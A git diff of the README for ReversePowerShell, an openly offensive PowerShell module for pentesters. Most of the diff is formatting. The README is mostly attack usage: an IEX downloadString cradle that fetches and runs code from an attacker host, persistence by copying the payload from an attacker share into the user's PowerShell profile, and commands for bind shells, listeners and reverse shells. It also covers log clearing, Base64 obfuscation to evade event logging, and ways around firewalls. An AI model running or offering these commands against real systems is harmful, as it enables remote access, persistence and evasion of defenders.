@@ -3,12 +3,12 @@ __See "Command Usage:" section below for command usage details__
 ### [NOW IN POWERSHELL GALLERY!!!](https://www.powershellgallery.com/packages/ReversePowerShell/1.3.2)
 ```powershell
 # Install Module
-Install-Module ReversePowerShell
+Install-Module -Name ReversePowerShell
 
 # Update Module
 Update-Module -Name ReversePowerShell
 # OR
-Install-Module ReversePowerShell -Force
+Install-Module -Name ReversePowerShell -Force
 ```
 ---
 
@@ -28,7 +28,9 @@ Once there it can be imported into a PowerShell session using the following comm
 ```powershell
 Import-Module ReversePowerShell
 ```
+
 Or in cases where you want to import the module from whatever file you are in...
+
 ```powershell
 Import-Module .\ReversePowerShell.psm1
 ```
@@ -37,6 +39,7 @@ If your are able to use Invoke-Expresion (IEX), this module (ReversePowerShell) 
 You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run.
 Notice the .ps1 extension. When using downloadString this will need to be a ps1 file to inject the module into
 memory in order to run the cmdlets.
+
 ```powershell
 IEX (New-Object -TypeName Net.WebClient).downloadString("http://<attacker ipv4>/ReversePowerShell.ps1")
 
@@ -45,12 +48,14 @@ IEX (New-Object -TypeName Net.WebClient).downloadString("http://<attacker ipv4>/
 ```
 
 IEX is blocked from users in most cases and Import-Module is monitored by things such as ATP. Downloading files to a target machine is not always allowed in a penetration test. Another method to use is Invoke-Command. This can be done using the following format.
+
 ```powershell
 Invoke-Command -ComputerName <target device> -FilePath .'\ReversePowerShell.ps1m' -Credential (Get-Credential)
 ```
 This will execute the file and it's contents on the remote computer.
 
 Another sneaky method would be to have the function load at the start of a new PowerShell window. This can be done by editing the $PROFILE file.
+
 ```powershell
 Write-Verbose "Creates powershell profile for user"
 If (!(Test-Path -Path $PROFILE)) { New-Item -Path $PROFILE -ItemType File -Force }
@@ -61,6 +66,10 @@ If (!(Test-Path -Path $PROFILE)) { New-Item -Path $PROFILE -ItemType File -Force
 #    - C:\Users\<username>\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
 #
 > Adding this module into the PowerShell $PROFILE will import all of the commands every time the executing user opens a PowerShell session. This means you will need to open a new PowerShell session after doing this in order to access the commands. Just like using ```source .bashrc``` to apply changes to the ~/.bashrc file in a linux terminal you can reload the profile by doing the following.
+```
+
+Another way to create a PowerShell profile for user
+
 ```powershell
 cmd /c 'copy \\<attacker ip>\MyShare\ReversePowerShell.ps1 $env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.psm1
 powershell.exe # Maybe but not sure on this one
@@ -72,6 +81,7 @@ powershell.exe # Maybe but not sure on this one
 #### START BIND SHELL
 The below command can be executed to start a bind shell that connects the defined port to PowerShell.
 This command binds PowerShell to port 8088. Invoke-ReversePowerShell, netcat, ncat, metasploit, and other tools can be used to connect to this bind shell. You are able to use Ctrl + C to cancel the bind listener.
+
 ```powershell
 Start-Bind -Port 8088
 ```
@@ -80,6 +90,7 @@ Start-Bind -Port 8088
 The below command was executed to start a listener on the Attack machine on port 8089. This can be
 connected too using Invoke-ReversePowerShell as well as ncat, netcat, metasploit, and other tools.
 The listener can be stopped or canceld by doing Ctrl + C.
+
 ```powershell
 Start-Listener -Port 8089
 ```
@@ -94,6 +105,7 @@ __SPECIAL FEATURES OF INVOKE-REVERSEPOWERSHELL__
 
 #### ISSUE REVERSE SHELL CONNECTION
 The below command is to be issued on the Target Machine. The below command connected to the listener over port 8089.
+
 ```powershell
 Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089
 # OR
@@ -102,6 +114,7 @@ Invoke-ReversePowerShell -Reverse -IpAddress 192.168.0.10 -Port 8089
 ```
 
 In the below command the listening port 8089 on 192.168.0.10 is connected too. When the session is exited the -ClearHistory parameter specified attempts to clear your sessions command history as well as clear the powershell log file.
+
 ```powershell
 Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089 -ClearHistory
 # OR
@@ -110,6 +123,7 @@ Invoke-ReversePowerShell -Reverse -IpAddress 192.168.0.10 -Port 8089 -ClearHisto
 ```
 
 The below command is to be issued on the Target Machine. The below command connected to the listener over port 8089. The -Obfuscate parameter obfuscates the commands executed using Base64 so they do not appear in clear text in the Event Log.
+
 ```powershell
 Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089 -Obfuscate
 # OR
@@ -119,11 +133,13 @@ Invoke-ReversePowerShell -Reverse -IpAddress 192.168.0.10 -Port 8089 -Obfuscate
 
 #### ISSUE BIND SHELL CONNECTION
 The below command is used to connect to a listening Bind Shell port. Any of the special parameters can be used to with the Bind parameter set name as well.
+
 ```powershell
 Invoke-ReversePowerShell -Bind -IpAddress 192.168.0.10 -Port 8089
 ```
 
 #### FIND EVIDENCE OF REVERSE SHELL CONNECTION
+
 ```powershell
 # Check the localhost for evidence of reverse shell in the event logs
 Find-ReversePowerShell
@@ -137,12 +153,14 @@ Find-ReverseShell -ComputerName DC01.domain.com -FilePath C:\Temp\Results.xml
 #### FIREWALL AND BLOCKED PORTS
 If you are not able to gain a connection it is most likely due to the Windows Firewall. If you have access on a machine as a user you will not be able to make firewall changes. You need admin priviledges for that. Use the high range ports RPC would connect to or other common port. If a range has been defined you can find the allowed ports at "HKLM:\Software\Microsoft\Rpc\Internet\ with Entry name Data Type". Otherwise when not defined any ports between 49152-65535 might work.
 This command may also display the port allowed RPC port range
+
 ```cmd
 netsh int ipv4 show dynamicport tcp
 ```
 
 The following commands can be used to view firewall rules. If one of these does not work.
 the other might.
+
 ```powershell
 # This way should work to display the firewall even if you are a user
 $FirewallRule = New-Object -ComObject HNetCfg.FwPolicy2
@@ -158,10 +176,13 @@ cmd /c netsh advfirewall firewall show rule name=all
 
 #### VERIFY LISTENING PORTS
 You can verify/view actively listening ports on the target computer by issuing the following command.
+
 ```powershell
 Get-NetTcpConnection -State Listen
 ```
+
 or if you are a command prompt kind of person;
+
 ```powershell
 netstat -q
 ```
